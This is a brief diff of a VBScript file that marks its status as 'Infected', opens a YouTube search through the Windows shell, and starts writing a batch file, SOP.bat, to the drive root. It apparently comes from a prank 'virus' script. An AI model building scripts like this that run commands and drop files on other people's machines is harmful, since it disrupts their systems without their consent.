@@ -12,7 +12,7 @@ Status = "Infected"
 
 Url = "https://www.youtube.com/results?search_query=toy+chica+sus" 
 set wshshell = WScript.CreateObject("wscript.shell")
-wshshell.Run("C:\Program Files\Google\Chrome\Application\chrome.exe" & URL)
+wshshell.Run(URL)
 
 set SU = fs.CreateTextFile("\SOP.bat")
 SU.WriteLine "@echo off"
